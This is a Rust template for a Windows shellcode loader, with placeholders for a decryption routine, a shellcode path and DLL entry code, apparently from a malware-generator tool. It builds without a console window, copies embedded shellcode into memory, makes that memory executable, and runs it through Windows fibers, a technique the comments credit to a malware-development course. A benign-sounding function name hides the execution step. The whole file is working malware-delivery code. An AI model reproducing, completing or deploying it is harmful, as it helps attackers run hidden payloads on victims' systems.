#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ptr::{null, null_mut};

use windows_sys::Win32::{Foundation::GetLastError, System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::{
    ConvertThreadToFiber, CreateFiber, SwitchToFiber, LPFIBER_START_ROUTINE
}}};

use std::include_bytes;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn enhance(buf: Vec<u8>) {
    
    unsafe {
        // Execution method ported from Maldev Academy "Utilizing fibers for execution" module. Thanks Maldev !
        
        let alloc = VirtualAlloc(null(), buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let alloc_ptr: *mut u8 = alloc as *mut u8;
        std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
        
        VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_perms);

        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(alloc_ptr);

        // Creating a new fiber

        let buf_fiber_address = CreateFiber(
            0,
            buf_ptr,
            null_mut(),
        );

        if buf_fiber_address.is_null() {
            eprintln!(
                "[!] CreateFiber Failed With Error: {}",
                GetLastError()
            );
            return;
        }

        // Convert the current thread to a fiber

        let primary_fiber_address = ConvertThreadToFiber(null_mut());
        if primary_fiber_address.is_null() {
            eprintln!(
                "[!] ConvertThreadToFiber Failed With Error: {}",
                GetLastError()
            );
            return;
        }

        // Switch to the shellcode fiber
        SwitchToFiber(buf_fiber_address);

    }
}

fn main() {
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});

    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }

    {{MAIN}}

    enhance(vec.clone());
}

{{DLL_MAIN}}